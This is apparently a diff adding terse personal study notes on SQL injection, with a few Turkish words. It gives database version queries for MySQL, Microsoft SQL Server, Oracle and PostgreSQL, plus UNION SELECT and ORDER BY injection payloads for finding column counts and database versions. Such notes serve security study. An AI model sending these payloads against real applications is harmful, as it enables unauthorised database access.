@@ -1,0 +1,27 @@
+
+Database type	Query
+Microsoft, MySQL	SELECT @@version
+Oracle	SELECT * FROM v$version
+PostgreSQL	SELECT version()
+
+' UNION SELECT @@version--
+
+
+UNION SELECT 'abc' FROM dual
+
+
+Oracle	SELECT banner FROM v$version
+SELECT version FROM v$instance
+
+
+
+' ORDER BY 1--
+' ORDER BY 2--
+
+analizimiz
+
+order by 2  3 error.
+
+' UNION SELECT banner, NULL FROM v$version--
+
+
